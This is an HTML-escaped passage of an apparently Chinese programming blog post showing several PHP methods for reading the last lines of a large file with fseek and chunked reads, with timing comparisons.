style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;&amp;nbsp;&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;.=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fgets&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$line&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;--;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;fclose&amp;nbsp;(&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&amp;nbsp;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;整个代码执行完成耗时 0.0095 (s)&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;方法二&lt;br /&gt;\r\n还是采用fseek的方式从文件最后开始读,但这时不是一位一位的读,而是一块一块的读,每读一块数据时,就将读取后的数据放在一个buf里,然后通过换 行符(\\n)的个数来判断是否已经读完最后$num行数据.&lt;br /&gt;\r\n实现代码如下&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://justcoding.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=%24fp%20%3D%20fopen(%24file%2C%20%22r%22)%3B%0A%24num%20%3D%2010%3B%0A%24chunk%20%3D%204096%3B%0A%24fs%20%3D%20sprintf(%22%25u%22%2C%20filesize(%24file))%3B%0A%24max%20%3D%20(intval(%24fs)%20%3D%3D%20PHP_INT_MAX)%20%3F%20PHP_INT_MAX%20%3A%20filesize(%24file)%3B%0Afor%20(%24len%20%3D%200%3B%20%24len%20%3C%20%24max%3B%20%24len%20%2B%3D%20%24chunk)%20%7B%20%20%20%20%20%0A%09%24seekSize%20%3D%20(%24max%20-%20%24len%20%26gt%3B%20%24chunk)%20%3F%20%24chunk%20%3A%20%24max%20-%20%24len%3B%0A%20%20%20%20fseek(%24fp%2C%20(%24len%20%2B%20%24seekSize)%20*%20-1%2C%20SEEK_END)%3B%0A%20%20%20%20%24readData%20%3D%20fread(%24fp%2C%20%24seekSize)%20.%20%24readData%3B%0A%20%0A%20%20%20%20if%20(substr_count(%24readData%2C%20%22%5Cn%22)%20%26gt%3B%3D%20%24num%20%2B%201)%20%7B%0A%20%20%20%20%20%20%20%20preg_match(%22!(.*%3F%5Cn)%7B%22.(%24num).%22%7D%24!%22%2C%20%24readData%2C%20%24match)%3B%0A%20%20%20%20%20%20%20%20%24data%20%3D%20%24match%5B0%5D%3B%0A%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%7D%0A%7D%0Afclose(%24fp)%3B%0Aecho%20%24data%3B&quot; quality=&quot;high&quot; allowscriptaccess=&quot;always&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;&amp;nbsp;&lt;a href=&quot;http://justcoding.iteye.com/blog/986293&quot; title=&quot;收藏这段代码&quot; style=&quot;color:#006600;text-decoration:underline;&quot;&gt;&lt;img class=&quot;star&quot; src=&quot;http://justcoding.iteye.com/images/icon_star.png&quot; alt=&quot;收藏代码&quot; style=&quot;border-top-width:0px;border-right-width:0px;border-bottom-width:0px;border-left-width:0px;border-style:initial;border-color:initial;&quot; /&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fopen&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$num&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;10;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$chunk&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;4096;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fs&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;sprintf(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;%u&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;filesize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$max&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;intval&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fs&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;==&amp;nbsp;PHP_INT_MAX)&amp;nbsp;?&amp;nbsp;PHP_INT_MAX&amp;nbsp;:&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;filesize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$file&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;for&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;lt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$max&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;+=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$chunk&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$seekSize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$max&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;-&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;amp;gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$chunk&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;?&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$chunk&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;:&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$max&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;-&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fseek&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$len&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;+&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$seekSize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;*&amp;nbsp;-1,&amp;nbsp;SEEK_END);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$readData&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;fread&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$seekSize&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;.&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$readData&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;(substr_count(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$readData&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;\\n&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;amp;gt;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$num&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;+&amp;nbsp;1)&amp;nbsp;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;preg_match(&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;!(.*?\\n){&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;.(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$num&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;&quot;}$!&quot;&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$readData&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$match&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$match&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;[0];&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;break&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;fclose(&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$fp&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&amp;nbsp;&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;整个代码执行完成耗时 0.0009(s).&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;方法三&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; id=&quot;&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;font-size:12px;background-color:transparent;width:694px;overflow-x:auto;overflow-y:auto;margin-left:9px;padding-top:1px;padding-right:1px;padding-bottom:1px;padding-left:1px;word-break:break-all;word-wrap:break-word;&quot;&gt;&lt;div class=&quot;bar&quot;&gt;&lt;div class=&quot;tools&quot; style=&quot;padding-top:3px;padding-right:3px;padding-bottom:3px;padding-left:3px;text-align:left;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;color:black;font-weight:bold;&quot;&gt;Php代码&amp;nbsp;&lt;embed src=&quot;http://justcoding.iteye.com/javascripts/syntaxhighlighter/clipboard_new.swf&quot; width=&quot;14&quot; height=&quot;15&quot; flashvars=&quot;clipboard=function%20tail(%24fp%2C%24n%2C%24base%3D5)%0A%7B%0A%20%20%20%20assert(%24n%3E0)%3B%0A%20%20%20%20%24pos%20%3D%20%24n%2B1%3B%0A%20%20%20%20%24lines%20%3D%20array()%3B%0A%20%20%20%20while(count(%24lines)%3C%20%3D%24n)%7B%0A%20%20%20%20%20%20%20%20try%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20fseek(%24fp%2C-%24pos%2CSEEK_END)%3B%0A%20%20%20%20%20%20%20%20%7D%20catch%20(Exception%20%24e)%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20fseek(0)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%24pos%20*%3D%20%24base%3B%0A%20%20%20%20%20%20%20%20while(!feof(%24fp))%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20array_unshift(%24lines%2Cfgets(%24fp))%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20return%20array_slice(%24lines%2C0%2C%24n)